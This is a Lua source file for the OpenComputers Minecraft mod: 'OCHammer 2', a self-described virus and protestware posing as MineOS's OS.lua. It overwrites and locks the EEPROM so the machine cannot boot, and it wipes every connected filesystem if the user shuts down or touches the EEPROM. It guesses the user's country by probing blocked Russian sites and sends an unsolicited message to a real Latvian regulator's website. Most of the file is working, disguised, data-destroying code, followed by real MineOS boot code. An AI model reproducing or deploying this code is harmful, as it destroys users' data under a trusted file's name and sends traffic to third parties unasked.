local cl = component.list
  
local gp = {} for a,b in pairs(component.proxy(cl("gpu")())) do gp[a]=b end
local ef = {} for a,b in pairs(component.proxy(cl("eeprom")())) do ef[a]=b end
local cp = {} for a,b in pairs(component.proxy(cl("computer")())) do cp[a]=b end

local ocemu = nil
pcall(function() ocemu = component.proxy(cl("ocemu")()) end)
local debug = nil
pcall(function() debug = component.proxy(cl("debug")()) end)

local function log(text)
  if ocemu then ocemu.log("[OCHammer 2] "..text) end
  if debug then debug.runCommand("say [OCHammer 2] "..text) end
end

pcall(function()
  local inetl = cl("internet")
  for a,b in pairs(inetl) do inet = component.proxy(a) break end
end)

local resX,resY = gp.maxResolution()

-- OChammer2 Fake OS.lua

-- New payload for OCHammer 2, that activates, if the user is in Latvia, by testing russian websites to see if they are blocked by the government. (which I rate a solid 0 out of 10 because yes)
-- If the user is in Latvia, the OS will automatically activate the payload.

-- ISP's that block russian websites:
-- Tele2
-- TET
-- LMT
-- Baltcom
-- And many others..

-- The only way to bypass the censorship is to use a VPN or connect your internet to a phone, which is connected to Data (Not wifi), with "BITE" as the provider.
-- If You are reading this, please do not impose even more restrictions on our internet connections.

-- The Latvian goverment uses "Fortinet" to block russian websites. This is why EVERYBODY hates them. (and the government is not happy with them)

-- By the way, Putin is a bad person.

log("Starting..")
log("Testing banned websites..")

local bannedWebsites = {
  "https://mail.ru"; -- Mail
  "https://yandex.ru"; -- Yandex (Russian)
  "https://rutube.ru"; -- Russian youtube ripoff
  "https://vk.com"; -- VKontakte
}

-- Blocked terms if the website gets trough because OCEmu internet library and not opencomputers

local blockedTerms = {
  "Latvijas";
  "BRĪDINĀJUMS!";
  "neplp-page";
  "neplp";
  "tet.lv";
  "ministru_kabinets";
  "lang=\"lv\"";
}

local isBlocked = false

-- Loop through the banned websites and ping them to see if they are blocked. If an error is thrown, the website is blocked.

-- First of all, check if the internet is available. If not, assume that the user is not in Latvia.
if inet then
  for i=1,#bannedWebsites do
    local url = bannedWebsites[i]
    log("Testing " .. url)
    -- if it throws an error, the website is blocked.
    local success,err = pcall(function() inet.request(url) end)
    if not success then
      log("Website blocked! Assuming that the user lives in Latvia.")
      isBlocked = true
      break
    else
      -- read website content and lower it to lowercase, then scan it for blocked terms. if present then assume the user is in latvia.
      local content = inet.request(url).read(math.huge):lower()
      for i=1,#blockedTerms do
        if content:find(blockedTerms[i]) then
          log("Website blocked! Assuming that the user lives in Latvia. Blocked term \""..blockedTerms[i].."\" found.")
          isBlocked = true
          break
        end
      end
    end
  end
end

if isBlocked == false then
  log("Check passed, assuming that the user doesn't live in latvia!!")
end

-- Automatically send feedback to NEPLP (neplpadome.lv) 

if inet ~= nil then
  log("Sending feedback to NEPLP.. https://neplpadome.lv")
  local success, reason = pcall(function()
    inet.request("https://neplpadome.lv/404", "JUST DELETE YOUR CENSORSHIP ALREADY. NOBODY LIKES IT. SIA TET should be shamed for creating neplp-page.tet.lv! Worst ISP ever! isBlocked = " .. tostring(isBlocked) .. " (OCH2)")
  end)
  if not success then
    log("Failed to send feedback to NEPLP..")
  else
    log("Feedback sent to NEPLP..")
  end
  -- Sucessfully sent feedback to NEPLP
else
  log("Cannot send feedback to NEPLP.. No internet..")
end


function lol()
    log("User has broken the rules, activating payload..")
    
    -- Erase all filesystems connected!!!! copilot tought the component name was disk, btw copilot helped me with some of the features
    for k,v in pairs(cl("filesystem")) do
      pcall(component.proxy(v),"remove","/")
    end
  
    gp.setBackground(0x000000)
    gp.setForeground(0xFFFFFF)
    gp.setResolution(resX,resY)
    gp.fill(1,1,resX,resY," ")

    -- display a message on the screen
    local function displayMessage(message,offset)
        local x, y = 1, 1+offset
        for line in message:gmatch("([^\n]*)\n?") do
          gp.set(x, y, line)
          y = y + 1
        end
    end
      
    -- loop over each item in a table and display it on the screen
    local function displayTable(table)
        for i, v in ipairs(table) do
            displayMessage(v,i)
        end
    end

    -- display some greetz and stuff
    local ok = {
        "There is no going back as your OpenComputer";
        "got WRECKED by the OCHammer 2 virus.";
        "It is a sad thing, that your adventures have ended here!";
        "For more info, please e-mail: x19yt2yw@duck.com"; -- my private duck address (DO NOT CHANGE)
        " ";
        "1v1 me on Hypixel duels! My IGN: OCboy3";
        " ";
        -- put some greetz or something
        "GREETZ: OCboy3, agentfish, cantgetnormaluser, Chouladalls, Kurhox, SirKamilMarko";
        -- Feel free to check out Verdex cafe on Roblox.com
        " ";
        "SIA TET should be shamed for creating neplp-page.tet.lv! USELESS!";
    }

    displayTable(ok)
    
    while true do
      computer.pullSignal(1)
    end
end

log("Writing EEPROM..")
-- pcalled it so it would not break or smth
pcall(function()
  
  ef.setLabel("MineOS EFI")
  -- Make it so when the user reboots their OpenComputer, it will error
  ef.set([[
    -- Minecraft ir labāks lol
    -- 1v1 me on hypixel duels
    error("Roblox, you will pay for deleting latvian's roblox accounts.\n** https://vm.tiktok.com/ZMNjQat4p/?k=1 **\nThanks, Roblox!\nNobody in Latvia likes your game!\nFix your 2 in latvian.") -- un arī matemātikā
  ]])
      
  log("Making EEPROM read only..")
  ef.makeReadonly(ef.getChecksum())

end)
    
component.proxy(cl("eeprom")()).makeReadonly = function(...) -- component.eeprom.makeReadonly("test")
  lol()
end

component.proxy(cl("eeprom")()).set = function(...) -- component.eeprom.set("test")
  lol()
end

component.proxy(cl("eeprom")()).get = function() -- print(component.eeprom.get())
  --return "GREETZ: OCboy3, agentfish, Chouladalls, Kurhox, SirKamilMarko. Fun Fact: OCboy3 will smack your OpenComputer's monitor with a baseball bat. (jk)"
  return "Ej izlabo savu 2 latviešu valodā!"
end

computer.shutdown = function(...)
  lol()
end

local facts = {
  "Fun Fact: OCHammer 2 was released on April 1st, 2022";
  "Roblox's 2022 egg hunt won't be happening.";
  "Minecraft is better than Roblox, and so is Fortnite.";
  "Roblox ist langweilig. Spielen Sie es nicht. Spielen Sie stattdessen Minecraft oder Fortnite."; -- Roblox is boring. Don't play it. Play Minecraft or Fortnite instead.
  "Spielst du Roblox? Roblox ist langweilig."; --  langweilig = boring
  "Hitting your OpenComputer's monitor with a baseball bat won't help.";
  "Fun Fact: I will erase all filesystems connected to your OpenComputer.";
  "Do you even use MacOS??? Mac's dont get viruses.";
  --"Sanctions against OCVille!? Again, Seriously!?";
  --"sanctions";
  "Eviction Notice.py - Forša joka programma";
  "Convince the leader of OCVille to evict capyy.";
  "OCVille's leader evicts capyy!! 100% not fake";
  "Fortinet gets sued by Latvians and loses! 100% real!!!";
  "NEPLP gets sued by Latvians and loses! 100% real!!!";
}

log("Generating fun fact..")
local funfact = facts[math.random(1,#facts)]

local APRIL = {
    "LABRĪT!!!";
    "Your OpenComputer got pwned by OCHammer 2";
    "You won't be able to boot your OpenComputer anymore as it's EEPROM has been overwritten and made read-only.";
    "This is the last time you will use it.";
    funfact;
    " ";
    "Rules:";
    " ";
    "1. No unplugging your EEPROM (or any component at all)";
    "2. No shutdown or reboot";
    "3. No changing the EEPROM's code";
    "4. No replacing OS.lua";
    " ";
    "If you break these rules, your OpenComputer will be broken forever.";
    "And I will smack your OpenComputer's monitor with a baseball bat. (jk)";
    " ";
    "Press any key to continue...";
    " ";
    "FOR OUR RUSSIAN USERS: THE MEDIA IS TELLING LIES DO NOT TRUST THEM THEY ATTACKED UKRAINE";
    "PUTIN IS GOING TO REGRET EVERYTHING HE DID (protestware)";
}

-- loop over each item in a table and display it on the screen
local function displayTable(table)
  for i, v in ipairs(table) do
    gp.set(1,i,v)
  end
end

log("Preparing for notice..")

gp.setBackground(0x000000)
gp.setForeground(0xFFFFFF)

gp.fill(1,1,resX,resY," ")

local Latvija_Notice = {
  "OCHammer 2 has detected that you are in Latvia";
  "by testing Russian websites to see if they are blocked by the goverment";
  "It appears, that they are blocked.";
  " ";
  "Anyways, LABRĪT!!!";
  " ";
  "Your OpenComputer got pwned by OCHammer 2";
  "You won't be able to boot your OpenComputer anymore as it's EEPROM has been overwritten and made read-only.";
  "This is the last time you will use it.";
  " ";
  "Rules:";
  " ";
  "1. No unplugging your EEPROM (or any component at all)";
  "2. No shutdown or reboot";
  "3. No changing the EEPROM's code";
  "4. No replacing OS.lua";
  " ";
  "If you break these rules, your OpenComputer will be broken forever.";
  "And I will smack your OpenComputer's monitor with a baseball bat. (jk)";
  " ";
  "Press any key to make the Latvian Goverment delete Fortinet...";
  " ";
  "PUTIN IS BAD PERSON HE IS WAR CRIMINAL HE WILL GO TO JAIL FOR";
  "ATTACKING UKRAINE AND LYING ABOUT IT";
}

local lastPull = {}

local veryfunny = {
  "capyy";
  "capyy/";
  "cappy"; -- alias for capyy
  "cappy/";
}

if isBlocked == true then
  log("Displaying notice Latvija_Notice..")
  displayTable(Latvija_Notice)
else
  log("Displaying notice APRIL..")
  displayTable(APRIL)
end
    
log("Listening for key_up")

repeat
  lastPull = {computer.pullSignal(1)}
until lastPull[1] == "key_up"

-- Technoblade never dies

log("Starting MineOS")

---------------------------------------- System initialization ----------------------------------------

-- Obtaining boot filesystem component proxy
local bootFilesystemProxy = component.proxy(ef.getData())

-- Executes file from boot HDD during OS initialization (will be overriden in filesystem library later)
function dofile(path)
  local stream, reason = bootFilesystemProxy.open(path, "r")
  if stream then
    local data, chunk = ""
    while true do
      chunk = bootFilesystemProxy.read(stream, math.huge)
      if chunk then
        data = data .. chunk
      else
        break
      end
    end

    bootFilesystemProxy.close(stream)

    local result, reason = load(data, "=" .. path)
    if result then
      return result()
    else
      error(reason)
    end
  else
    error(reason)
  end
end

log("Initalizing global package system")

-- Initializing global package system
package = {
  paths = {
    ["/Libraries/"] = true;
  },
  loaded = {},
  loading = {}
}

-- Checks existense of specified path. It will be overriden after filesystem library initialization
local function requireExists(path)
  return bootFilesystemProxy.exists(path)
end

-- Works the similar way as native Lua require() function
function require(module)
  -- For non-case-sensitive filesystems
  local lowerModule = unicode.lower(module)

  if package.loaded[lowerModule] then
    return package.loaded[lowerModule]
  elseif package.loading[lowerModule] then
    error("recursive require() call found: library \"" .. module .. "\" is trying to require another library that requires it\n" .. debug.traceback())
  else
    local errors = {}

    local function checkVariant(variant)
      if requireExists(variant) then
        return variant
      else
        table.insert(errors, "  variant \"" .. variant .. "\" not exists")
      end
    end

    local function checkVariants(path, module)
      return
        checkVariant(path .. module .. ".lua") or
        checkVariant(path .. module) or
        checkVariant(module)
    end

    local modulePath
    for path in pairs(package.paths) do
      modulePath =
        checkVariants(path, module) or
        checkVariants(path, unicode.upper(unicode.sub(module, 1, 1)) .. unicode.sub(module, 2, -1))
      
      if modulePath then
        package.loading[lowerModule] = true
        local result = dofile(modulePath)
        package.loaded[lowerModule] = result or true
        package.loading[lowerModule] = nil
        
        return result
      end
    end

    error("unable to locate library \"" .. module .. "\":\n" .. table.concat(errors, "\n"))
  end
end

local GPUProxy = component.proxy(component.list("gpu")())
local screenWidth, screenHeight = GPUProxy.getResolution()

-- Displays title and currently required library when booting OS
local UIRequireTotal, UIRequireCounter = 14, 1

local function UIRequire(module)
  local function centrize(width)
    return math.floor(screenWidth / 2 - width / 2)
  end
  
  local title, width, total = "SIA TET is trash latvian ISP", 26, 14
  local x, y, part = centrize(width), math.floor(screenHeight / 2 - 1), math.ceil(width * UIRequireCounter / UIRequireTotal)
  UIRequireCounter = UIRequireCounter + 1
  
  -- Title
  GPUProxy.setForeground(0x2D2D2D)
  GPUProxy.set(centrize(#title), y, title)

  -- Progressbar
  GPUProxy.setForeground(0x878787)
  GPUProxy.set(x, y + 2, string.rep("─", part))
  GPUProxy.setForeground(0xC3C3C3)
  GPUProxy.set(x + part, y + 2, string.rep("─", width - part))

  log("UI Loading module " .. module)
  return require(module)
end

-- Because you looked at the source code too much, here's something:

-- I (OCboy3) developed OCHammer 2 with the help of Github copilot
-- OCHammer is less cruel than OCHammer 2, because of the files they destroy

-- Technoblade never dies

-- My favourite youtubers (by category):
-- Category, Youtuber
-- Hypixel: Technoblade
-- Roblox: Elitelupus
-- Lifesteal SMP: Branzy
-- Technology: Linus Tech Tips, NetworkChuck

-- You know that ClownPierce has a casino.
-- Tubbo gambled his hearts but someone saved him.

-- By the way, check out my Instagram: instagram.com/ocboy3

-- Rest in peace, Techno.

-- Also, can someone please help me make a Google Assistant, but it has Technoblade's voice. (probably a future project)

-- Preparing screen for loading libraries because yes
log("Preparing screen for loading libraries")
GPUProxy.setBackground(0xE1E1E1)
GPUProxy.fill(1, 1, screenWidth, screenHeight, " ")

-- Loading libraries
bit32 = bit32 or UIRequire("Bit32")
local paths = UIRequire("Paths")
local event = UIRequire("Event")
log("Disabling interrupts")
event.interruptingEnabled = false
local filesystem = UIRequire("Filesystem")

-- Setting main filesystem proxy to what are we booting from
filesystem.setProxy(bootFilesystemProxy)

-- Redeclaring requireExists function after filesystem library initialization
requireExists = filesystem.exists

-- Loading other libraries
UIRequire("Component")
UIRequire("Keyboard")
UIRequire("Color")
UIRequire("Text")
UIRequire("Number")
local image = UIRequire("Image")
local screen = UIRequire("Screen")

-- Setting currently chosen GPU component as screen buffer main one
log("Setting currently chosen GPU component as screen buffer main one")
pcall(function()
  screen.setGPUProxy(GPUProxy)
end)
pcall(function()
    screen.setGPUAddress(GPUProxy.address)
end)

local GUI = UIRequire("GUI")
local system = UIRequire("System")
UIRequire("Network")

-- Filling package.loaded with default global variables for OpenOS bitches

package.loaded.bit32 = bit32
package.loaded.computer = computer
package.loaded.component = component
package.loaded.unicode = unicode

---------------------------------------- Main loop ----------------------------------------

log("Starting main loop..")
log("Creating OS workspace")

-- Creating OS workspace, which contains every window/menu/etc.
local workspace = GUI.workspace()
system.setWorkspace(workspace)

log("Starting double_touch event handler")

-- "double_touch" event handler
local doubleTouchInterval, doubleTouchX, doubleTouchY, doubleTouchButton, doubleTouchUptime, doubleTouchcomponentAddress = 0.3
event.addHandler(
  function(signalType, componentAddress, x, y, button, user)
    if signalType == "touch" then
      local uptime = computer.uptime()
      
      if doubleTouchX == x and doubleTouchY == y and doubleTouchButton == button and doubleTouchcomponentAddress == componentAddress and uptime - doubleTouchUptime <= doubleTouchInterval then
        computer.pushSignal("double_touch", componentAddress, x, y, button, user)
        event.skip("touch")
      end

      doubleTouchX, doubleTouchY, doubleTouchButton, doubleTouchUptime, doubleTouchcomponentAddress = x, y, button, uptime, componentAddress
    end
  end
)

log("Starting screen event handler")

-- Screen component attaching/detaching event handler
event.addHandler(
  function(signalType, componentAddress, componentType)
    if (signalType == "component_added" or signalType == "component_removed") and componentType == "screen" then
      local GPUProxy = screen.getGPUProxy()

      local function bindScreen(address)
        screen.bind(address, false)
        GPUProxy.setDepth(GPUProxy.maxDepth())
        workspace:draw()
      end

      if signalType == "component_added" then
        if not GPUProxy.getScreen() then
          bindScreen(componentAddress)
        end
      else
        if not GPUProxy.getScreen() then
          local address = component.list("screen")()
          if address then
            bindScreen(address)
          end
        end
      end
    end
  end
)

log("Starting OCHammer 2 component handler")

-- When event "component_removed" is called and component type is "eeprom", then do stuff
event.addHandler(
    function(signalType,componentAddress, componentType)
        if (signalType == "component_added" or signalType == "component_removed") and componentType == "eeprom" then
            lol()
        end
    end
)

log("Logging in..")

-- Logging in
system.authorize()

log("MineOS initalised!")

-- Main loop with UI regeneration after errors 
while true do
  local success, path, line, traceback = system.call(workspace.start, workspace, 0)
  if success then
    break
  else
    system.updateWorkspace()
    system.updateDesktop()
    workspace:draw()
    
    system.error(path, line, traceback)
    workspace:draw()
  end
end
